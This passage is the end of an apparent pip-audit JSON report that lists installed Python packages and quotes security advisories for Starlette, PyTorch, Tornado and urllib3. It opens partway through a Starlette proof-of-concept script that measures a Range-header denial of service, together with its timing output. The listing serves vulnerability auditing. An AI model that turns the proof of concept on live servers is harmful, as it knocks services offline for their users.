1_000_000)          print(f\"[DEBUG] range_body length: {len(range_body)} bytes\")     elapsed_time = test(header, file_size)     print(f\"[DEBUG] elapsed time: {elapsed_time:.6f} seconds\\n\")   if __name__ == \"__main__\":     print(f\"[INFO] Starlette Version: {starlette.__version__}\")     for n in [5000, 10000, 20000, 40000]:         run_once(n)  \"\"\" $ python3 poc_dos_range.py [INFO] Starlette Version: 0.48.0 [DEBUG] range_body length: 5002 bytes [DEBUG] elapsed time: 0.053932 seconds  [DEBUG] range_body length: 10002 bytes [DEBUG] elapsed time: 0.209770 seconds  [DEBUG] range_body length: 20002 bytes [DEBUG] elapsed time: 0.885296 seconds  [DEBUG] range_body length: 40002 bytes [DEBUG] elapsed time: 3.238832 seconds \"\"\" ```  ### Impact Any Starlette app serving files via FileResponse or StaticFiles; frameworks built on Starlette (e.g., FastAPI) are indirectly impacted when using file-serving endpoints. Unauthenticated remote attackers can exploit this via a single HTTP request with a crafted Range header."}]}, {"name": "stone", "version": "3.3.1", "vulns": []}, {"name": "stoney-nakoda-translation", "skip_reason": "Dependency not found on PyPI and could not be audited: stoney-nakoda-translation (0.1.0)"}, {"name": "storage3", "version": "0.11.3", "vulns": []}, {"name": "streamlit", "version": "1.41.1", "vulns": []}, {"name": "strenum", "version": "0.4.15", "vulns": []}, {"name": "supabase", "version": "2.15.1", "vulns": []}, {"name": "supafunc", "version": "0.9.4", "vulns": []}, {"name": "svgelements", "version": "1.9.6", "vulns": []}, {"name": "sympy", "version": "1.13.1", "vulns": []}, {"name": "tabulate", "version": "0.9.0", "vulns": []}, {"name": "tb-nightly", "version": "2.19.0a20250108", "vulns": []}, {"name": "tempdir", "version": "0.7.1", "vulns": []}, {"name": "tenacity", "version": "9.0.0", "vulns": []}, {"name": "tencentcloud-sdk-python", "version": "3.0.1356", "vulns": []}, {"name": "tensor", "version": "0.3.6", "vulns": []}, {"name": "tensorboard", "version": "2.18.0", "vulns": []}, {"name": "tensorboard-data-server", "version": "0.7.2", "vulns": []}, {"name": "tensorflow-datasets", "version": "4.9.7", "vulns": []}, {"name": "tensorflow-metadata", "version": "1.16.1", "vulns": []}, {"name": "tensorstore", "version": "0.1.71", "vulns": []}, {"name": "termcolor", "version": "2.5.0", "vulns": []}, {"name": "text-unidecode", "version": "1.3", "vulns": []}, {"name": "textual", "version": "6.2.1", "vulns": []}, {"name": "tf-nightly", "skip_reason": "Dependency not found on PyPI and could not be audited: tf-nightly (2.19.0.dev20250107)"}, {"name": "tf-nightly-intel", "version": "2.19.0.dev20250107", "vulns": []}, {"name": "threadpoolctl", "version": "3.6.0", "vulns": []}, {"name": "tifffile", "version": "2025.6.1", "vulns": []}, {"name": "tiktoken", "version": "0.9.0", "vulns": []}, {"name": "tinydb", "version": "4.8.0", "vulns": []}, {"name": "tokenizers", "version": "0.22.1", "vulns": []}, {"name": "toml", "version": "0.10.2", "vulns": []}, {"name": "tomlkit", "version": "0.13.2", "vulns": []}, {"name": "toolz", "version": "1.0.0", "vulns": []}, {"name": "torch", "version": "2.5.1", "vulns": [{"id": "PYSEC-2025-41", "fix_versions": ["2.6.0"], "aliases": ["GHSA-53q9-r3pm-6pq6", "CVE-2025-32434"], "description": "PyTorch is a Python package that provides tensor computation with strong GPU acceleration and deep neural networks built on a tape-based autograd system. In version 2.5.1 and prior, a Remote Command Execution (RCE) vulnerability exists in PyTorch when loading a model using torch.load with weights_only=True. This issue has been patched in version 2.6.0."}, {"id": "GHSA-3749-ghw9-m3mg", "fix_versions": ["2.7.1rc1"], "aliases": ["CVE-2025-2953"], "description": "A vulnerability, which was classified as problematic, has been found in PyTorch 2.6.0+cu124. Affected by this issue is the function torch.mkldnn_max_pool2d. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used."}, {"id": "GHSA-887c-mr87-cxwp", "fix_versions": ["2.8.0"], "aliases": ["CVE-2025-3730"], "description": "A vulnerability, which was classified as problematic, was found in PyTorch 2.6.0. Affected is the function torch.nn.functional.ctc_loss of the file aten/src/ATen/native/LossCTC.cpp. The manipulation leads to denial of service. An attack has to be approached locally. The exploit has been disclosed to the public and may be used. The name of the patch is 46fc5d8e360127361211cb237d5f9eef0223e567. It is recommended to apply a patch to fix this issue."}]}, {"name": "torchaudio", "version": "2.5.1", "vulns": []}, {"name": "torchmetrics", "version": "0.10.3", "vulns": []}, {"name": "torchvision", "version": "0.20.1", "vulns": []}, {"name": "tornado", "version": "6.4.2", "vulns": [{"id": "GHSA-7cx3-6m66-7c5m", "fix_versions": ["6.5"], "aliases": ["CVE-2025-47287"], "description": "### Summary  When Tornado's ``multipart/form-data`` parser encounters certain errors, it logs a warning but continues trying to parse the remainder of the data. This allows remote attackers to generate an extremely high volume of logs, constituting a DoS attack. This DoS is compounded by the fact that the logging subsystem is synchronous.  ### Affected versions  All versions of Tornado prior to 6.5 are affected. The vulnerable parser is enabled by default.  ### Solution  Upgrade to Tornado version 6.5. In the meantime, risk can be mitigated by blocking `Content-Type: multipart/form-data` in a proxy."}]}, {"name": "tqdm", "version": "4.67.0", "vulns": []}, {"name": "traitlets", "version": "5.14.3", "vulns": []}, {"name": "transformers-stream-generator", "version": "0.0.5", "vulns": []}, {"name": "trio", "version": "0.28.0", "vulns": []}, {"name": "trio-websocket", "version": "0.11.1", "vulns": []}, {"name": "trl", "version": "0.23.1", "vulns": []}, {"name": "trove-classifiers", "version": "2025.5.9.12", "vulns": []}, {"name": "truststore", "version": "0.10.1", "vulns": []}, {"name": "twisted", "version": "24.11.0", "vulns": []}, {"name": "typeguard", "version": "4.4.2", "vulns": []}, {"name": "typer", "version": "0.15.1", "vulns": []}, {"name": "typer-slim", "version": "0.20.0", "vulns": []}, {"name": "types-requests", "version": "2.32.0.20250515", "vulns": []}, {"name": "typing-extensions", "version": "4.15.0", "vulns": []}, {"name": "typing-inspection", "version": "0.4.2", "vulns": []}, {"name": "tyro", "version": "0.9.19", "vulns": []}, {"name": "tzdata", "version": "2025.2", "vulns": []}, {"name": "tzlocal", "version": "5.3.1", "vulns": []}, {"name": "uc-micro-py", "version": "1.0.3", "vulns": []}, {"name": "ujson", "version": "5.10.0", "vulns": []}, {"name": "umap-learn", "version": "0.5.9.post2", "vulns": []}, {"name": "uritemplate", "version": "4.1.1", "vulns": []}, {"name": "urllib3", "version": "2.3.0", "vulns": [{"id": "GHSA-48p4-8xcf-vxj5", "fix_versions": ["2.5.0"], "aliases": ["CVE-2025-50182"], "description": "urllib3 [supports](https://urllib3.readthedocs.io/en/2.4.0/reference/contrib/emscripten.html) being used in a Pyodide runtime utilizing the [JavaScript Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) or falling back on [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest). This means you can use Python libraries to make HTTP requests from your browser or Node.js. Additionally, urllib3 provides [a mechanism](https://urllib3.readthedocs.io/en/2.4.0/user-guide.html#retrying-requests) to control redirects.  However, the `retries` and `redirect` parameters are ignored with Pyodide; the runtime itself determines redirect behavior.   ## Affected usages  Any code which relies on urllib3 to control the number of redirects for an HTTP request in a Pyodide runtime.   ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects may remain vulnerable if a Pyodide runtime redirect mechanism is unsuitable.   ## Remediation  If you use urllib3 in Node.js, upgrade to a patched version of urllib3.  Unfortunately, browsers provide no suitable way which urllib3 can use: `XMLHttpRequest` provides no control over redirects, the Fetch API returns `opaqueredirect` responses lacking data when redirects are controlled manually. Expect default browser behavior for redirects."}, {"id": "GHSA-pq67-6m6q-mj2v", "fix_versions": ["2.5.0"], "aliases": ["CVE-2025-50181"], "description": "urllib3 handles redirects and retries using the same mechanism, which is controlled by the `Retry` object. The most common way to disable redirects is at the request level, as follows:  ```python resp = urllib3.request(\"GET\", \"https://httpbin.org/redirect/1\", redirect=False) print(resp.status) # 302 ```  However, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:  ```python import urllib3  http = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect http = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above http = urllib3.PoolManager(retries=False)  # should return the first response  resp = http.request(\"GET\", \"https://httpbin.org/redirect/1\") ```  However, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.  ## Affected usages  Passing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.  By default, requests and botocore users are not affected.  ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects at the PoolManager level will remain vulnerable.  ## Remediation  You can remediate this vulnerability with the following steps:   * Upgrade to a patched version of urllib3. If your organization would benefit from the continued support of urllib3 1.x, please contact [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com) to discuss sponsorship or contribution opportunities.  * Disable redirects at the `request()` level instead of the `PoolManager()` level."}]}, {"name": "uvicorn", "version": "0.34.0", "vulns": []}, {"name": "verifiers", "version": "0.1.5.dev1", "vulns": []}, {"name": "vertexai", "version": "1.71.1", "vulns": []}, {"name": "virtualenv", "version": "20.29.1", "vulns": []}, {"name": "wandb", "version": "0.22.3", "vulns": []}, {"name": "watchdog", "version": "6.0.0", "vulns": []}, {"name": "watchfiles", "version": "1.1.0", "vulns": []}, {"name": "wcwidth", "version": "0.2.13", "vulns": []}, {"name": "webdriver-manager", "version": "4.0.2", "vulns": []}, {"name": "webencodings", "version": "0.5.1", "vulns": []}, {"name": "websocket-client", "version": "1.8.0", "vulns": []}, {"name": "websockets", "version": "14.1", "vulns": []}, {"name": "werkzeug", "version": "3.1.1", "vulns": []}, {"name": "wheel", "version": "0.45.1", "vulns": []}, {"name": "win32-setctime", "version": "1.2.0", "vulns": []}, {"name": "wrapt", "version": "1.17.0", "vulns": []}, {"name": "wsproto", "version": "1.2.0", "vulns": []}, {"name": "xlsxwriter", "version": "3.2.0", "vulns": []}, {"name": "xxhash", "version": "3.5.0", "vulns": []}, {"name": "xyzservices", "version": "2025.4.0", "vulns": []}, {"name": "yarl", "version": "1.18.3", "vulns": []}, {"name": "yfinance", "version": "0.2.65", "vulns": []}, {"name": "youtube-transcript-api", "version": "0.6.2", "vulns": []}, {"name": "zipp", "version": "3.21.0", "vulns": []}, {"name": "zope-interface", "version": "7.2", "vulns": []}, {"name": "zstandard", "version": "0.23.0", "vulns": []}], "fixes": []}
